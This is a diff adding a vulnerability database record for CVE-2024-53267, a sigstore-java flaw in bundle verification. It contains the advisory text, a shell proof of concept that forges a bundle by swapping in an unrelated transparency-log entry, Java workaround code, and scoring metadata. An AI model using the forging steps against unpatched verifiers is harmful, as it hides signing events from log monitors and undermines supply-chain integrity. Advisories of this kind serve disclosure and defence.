@@ -1,0 +1,337 @@
+vulnerability_id: VCID-r352-tejy-rqb9
+aliases:
+  - CVE-2024-53267
+  - GHSA-q4xm-6fjc-5f6w
+summary: |
+  sigstore-java has vulnerability with bundle verification
+  ### Summary
+  sigstore-java has insufficient verification for a situation where a validly-signed but "mismatched" bundle is presented as proof of inclusion into a transparency log
+
+  ### Impact
+
+  This bug impacts clients using any variation of KeylessVerifier.verify()
+
+  The verifier may accept a bundle with an unrelated log entry, cryptographically verifying everything but fails to ensure the log entry applies to the artifact in question, thereby "verifying" a bundle without any proof the signing event was logged.
+
+  This allows the creation of a bundle without fulcio certificate and private key combined with an unrelated but time-correct log entry to fake logging of a signing event. A malicious actor using a compromised identity may want to do this to prevent discovery via rekor's log monitors.
+
+  The signer's identity will still be available to the verifier. The signature on the bundle must still be on the correct artifact for the verifier to pass.
+
+  sigstore-gradle-plugin and sigstore-maven-plugin are not affected by this as they only provide signing functionality.
+
+  ### Steps To Reproduce
+
+  Build the java sigstore-cli at v1.0.0
+  ```shell
+  git clone --branch v1.0.0 git@github.com:sigstore/sigstore-java
+  cd sigstore-java
+  ./gradlew :sigstore-cli:build
+  tar -xf sigstore-cli/build/distributions/sigstore-cli-1.0.0-SNAPSHOT.tar --strip-components 1
+  ```
+
+  Create two random blobs
+  ```shell
+  dd bs=1 count=50 </dev/urandom > blob1
+  dd bs=1 count=50 </dev/urandom > blob2
+  ```
+
+  Sign each blob using the cli
+  ```shell
+  ./bin/sigstore-cli sign --bundle=blob1.sigstore.json blob1
+  ./bin/sigstore-cli sign --bundle=blob2.sigstore.json blob2
+  ```
+
+  Create a falsified bundle including the base64Signature and cert fields from blob1's bundle and the rekorBundle from blob2's bundle
+  ```shell
+  jq --slurpfile bundle2 blob2.sigstore.json '.verificationMaterial.tlogEntries = $bundle2[0].verificationMaterial.tlogEntries' blob1.sigstore.json > invalidBundle.sigstore.json
+  ```
+
+  Find the embedded artifact hash in the bundle, and compare to the sha256 sums of blob1 and blob2. See that the bundle tlog entry matches blob2.
+  ```shell
+  cat invalidBundle.sigstore.json | jq -r '.verificationMaterial.tlogEntries[0].canonicalizedBody' | base64 -d | jq -r '.spec.data.hash.value'
+
+  sha256sum blob1 blob2
+  ```
+
+  Verify the bundle against blob1
+  ```shell
+  ./bin/sigstore-cli verify --bundle=invalidBundle.sigstore.json blob1
+  # no errors???!
+  ```
+
+  ### Patches
+  Patched in v1.1.0 release with https://github.com/sigstore/sigstore-java/pull/856
+  Added conformance test for all clients in: https://github.com/sigstore/sigstore-conformance/pull/166
+
+  ### Workarounds
+  1. Verifiers can recreate the log entry and compare it to the provided log entry.
+  ```
+  var bundle = Bundle.from(bundleFile, StandardCharsets.UTF);
+  var rekorEntry = bundle.getEntries().get(0)
+  var calculatedHashedRekord =
+      Base64.toBase64String(
+          HashedRekordRequest.newHashedRekordRequest(
+                 artifactDigest, Certificates.toPemBytes(leafCert), signature)
+              .toJsonPayload()
+              .getBytes(StandardCharsets.UTF_8));
+  if (!Objects.equals(calculatedHashedRekord, rekorEntry.getBody())) {
+    throw new Exception("Provided verification materials are inconsistent with log entry");
+  }
+  ```
+  2. Verifiers can contact the log and discover if the artifact signing event has indeed been added to the log
+  ```java
+  var bundle = Bundle.from(bundleFile, StandardCharsets.UTF);
+  var artifactDigest = Files.asByteSource(Path.of(artifact).toFile()).hash(Hashing.sha256()).asBytes();
+  var sigstoreTufClientBuilder = SigstoreTufClient.builder().usePublicGoodInstance();
+  var trustedRootProvider = TrustedRootProvider.from(sigstoreTufClientBuilder);
+  var entry = RekorEntryFetcher.fromTrustedRoot(trustedRootProvider).getEntryFromRekor(artifactDigest, Certificates.getLeaf(bundle.getCertPath()), bundle.getMessageSignature().get().getSignature());
+  RekorVerifier.newRekorVerifier(trustedRootProvider.get()).verifyEntry(entry);
+  ```
+severities:
+  - score: '0.00045'
+    scoring_system: epss
+    scoring_elements: '0.17226'
+    published_at: '2024-11-28 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: '0.00045'
+    scoring_system: epss
+    scoring_elements: '0.17624'
+    published_at: '2025-01-16 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: '0.00045'
+    scoring_system: epss
+    scoring_elements: '0.17338'
+    published_at: '2024-12-27 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: '0.00045'
+    scoring_system: epss
+    scoring_elements: '0.17315'
+    published_at: '2024-12-19 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: '0.00045'
+    scoring_system: epss
+    scoring_elements: '0.17350'
+    published_at: '2024-12-17 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: '0.00045'
+    scoring_system: epss
+    scoring_elements: '0.17830'
+    published_at: '2024-12-15 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: '0.00045'
+    scoring_system: epss
+    scoring_elements: '0.17732'
+    published_at: '2024-12-13 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: '0.00045'
+    scoring_system: epss
+    scoring_elements: '0.17645'
+    published_at: '2024-12-11 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: '0.00045'
+    scoring_system: epss
+    scoring_elements: '0.17329'
+    published_at: '2024-12-03 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 7e-05
+    scoring_system: epss
+    scoring_elements: '0.00273'
+    published_at: '2025-04-14 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 7e-05
+    scoring_system: epss
+    scoring_elements: '0.00283'
+    published_at: '2025-03-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 7e-05
+    scoring_system: epss
+    scoring_elements: '0.00214'
+    published_at: '2025-03-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 7e-05
+    scoring_system: epss
+    scoring_elements: '0.00281'
+    published_at: '2025-03-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 7e-05
+    scoring_system: epss
+    scoring_elements: '0.0028'
+    published_at: '2025-04-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 7e-05
+    scoring_system: epss
+    scoring_elements: '0.00279'
+    published_at: '2025-04-09 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 7e-05
+    scoring_system: epss
+    scoring_elements: '0.00276'
+    published_at: '2025-04-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 7e-05
+    scoring_system: epss
+    scoring_elements: '0.00274'
+    published_at: '2025-04-13 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 7e-05
+    scoring_system: epss
+    scoring_elements: '0.00277'
+    published_at: '2025-04-12 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 7e-05
+    scoring_system: epss
+    scoring_elements: '0.00278'
+    published_at: '2025-04-10 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 7e-05
+    scoring_system: epss
+    scoring_elements: '0.00359'
+    published_at: '2025-04-17 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 7e-05
+    scoring_system: epss
+    scoring_elements: '0.0036'
+    published_at: '2025-04-19 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 7e-05
+    scoring_system: epss
+    scoring_elements: '0.00358'
+    published_at: '2025-04-21 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 7e-05
+    scoring_system: epss
+    scoring_elements: '0.00356'
+    published_at: '2025-04-22 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 7e-05
+    scoring_system: epss
+    scoring_elements: '0.00354'
+    published_at: '2025-04-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 8e-05
+    scoring_system: epss
+    scoring_elements: '0.00448'
+    published_at: '2025-04-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 9e-05
+    scoring_system: epss
+    scoring_elements: '0.00538'
+    published_at: '2025-04-27 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 9e-05
+    scoring_system: epss
+    scoring_elements: '0.00534'
+    published_at: '2025-04-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 9e-05
+    scoring_system: epss
+    scoring_elements: '0.0054'
+    published_at: '2025-04-26 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: 9e-05
+    scoring_system: epss
+    scoring_elements: '0.00536'
+    published_at: '2025-04-25 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+  - score: MODERATE
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-q4xm-6fjc-5f6w
+  - score: '5.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
+    published_at: None
+    url: https://github.com/sigstore/sigstore-conformance/pull/166
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/sigstore/sigstore-conformance/pull/166
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2024-11-26T19:21:47Z/
+    published_at: None
+    url: https://github.com/sigstore/sigstore-conformance/pull/166
+  - score: '5.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
+    published_at: None
+    url: https://github.com/sigstore/sigstore-java
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/sigstore/sigstore-java
+  - score: '5.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
+    published_at: None
+    url: https://github.com/sigstore/sigstore-java/pull/856
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/sigstore/sigstore-java/pull/856
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2024-11-26T19:21:47Z/
+    published_at: None
+    url: https://github.com/sigstore/sigstore-java/pull/856
+  - score: '5.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
+    published_at: None
+    url: https://github.com/sigstore/sigstore-java/security/advisories/GHSA-q4xm-6fjc-5f6w
+  - score: MODERATE
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/sigstore/sigstore-java/security/advisories/GHSA-q4xm-6fjc-5f6w
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/sigstore/sigstore-java/security/advisories/GHSA-q4xm-6fjc-5f6w
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2024-11-26T19:21:47Z/
+    published_at: None
+    url: https://github.com/sigstore/sigstore-java/security/advisories/GHSA-q4xm-6fjc-5f6w
+  - score: '5.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-53267
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-53267
+weaknesses:
+  - CWE-937
+  - CWE-1035
+  - CWE-347
+  - CWE-345
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-53267
+    reference_type:
+    reference_id:
+  - url: https://github.com/sigstore/sigstore-conformance/pull/166
+    reference_type:
+    reference_id:
+  - url: https://github.com/sigstore/sigstore-java
+    reference_type:
+    reference_id:
+  - url: https://github.com/sigstore/sigstore-java/pull/856
+    reference_type:
+    reference_id:
+  - url: https://github.com/sigstore/sigstore-java/security/advisories/GHSA-q4xm-6fjc-5f6w
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-53267
+    reference_type:
+    reference_id: CVE-2024-53267
+  - url: https://github.com/advisories/GHSA-q4xm-6fjc-5f6w
+    reference_type:
+    reference_id: GHSA-q4xm-6fjc-5f6w
